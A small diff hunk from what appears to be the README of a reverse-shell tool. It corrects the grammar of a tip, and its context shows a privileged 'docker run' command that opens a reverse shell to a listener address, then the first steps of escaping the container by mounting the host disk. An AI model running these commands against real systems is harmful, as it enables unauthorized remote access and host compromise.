@@ -65,7 +65,7 @@ Useful if target is running docker, kubernetes, etc ...
 <pre><code>
 docker run --privileged --rm -it ariary/tacos-reverse [TACOS_LISTENER_IP]:[TACOS_LISTENER_PORT]
 </code></pre>
-<blockquote>💡: <code>--privileged</code> mode is not mandatory is to allows container escaping with:
+<blockquote>💡: <code>--privileged</code> mode is not mandatory. It is used to allow container escaping with:
 <pre><code>
 fdisk -l
 mkdir /mnt/hostfs
